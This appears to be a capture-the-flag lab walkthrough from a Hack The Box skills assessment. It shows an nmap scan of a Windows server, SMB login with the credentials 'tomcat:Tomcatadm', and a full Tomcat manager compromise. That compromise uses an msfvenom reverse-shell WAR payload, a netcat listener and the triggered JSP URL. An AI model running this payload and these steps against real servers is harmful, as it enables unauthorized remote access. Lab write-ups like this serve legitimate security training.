### Domain
status.inlanefreight.local

### Nmap

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -p 80,135,139,445,3389,8080 -sVC 172.16.1.11
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-18 04:20 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.012s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Inlanefreight Server Status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2023-07-17T07:46:00
|_Not valid after:  2024-01-16T07:46:00
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-18T08:21:00+00:00
|_ssl-date: 2023-07-18T08:21:05+00:00; -1s from scanner time.
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-title: Apache Tomcat/10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-18T08:21:00
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m58s, deviation: 3h07m49s, median: -1s
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:a6:18 (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-18T01:21:00-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
```

### SMB
Access with smbclient and credentials tomcat:Tomcatadm but nothing in here
`smbclient -U tomcat -L //172.16.1.11/`

### Tomcat
Opening firefox throught console we can access to manage tomcat app

`http://172.16.1.11:8080/manager/html`

Create a msfvenom reverse shell war format

`msfvenom -p windows/shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war> revshell.war`

Upload through war upload section, and access to the url with a netcat listener opened

`nc -nvlp 443`

http://172.16.1.11:8080/revshell/ekshuevkgtu.jsp

And we are in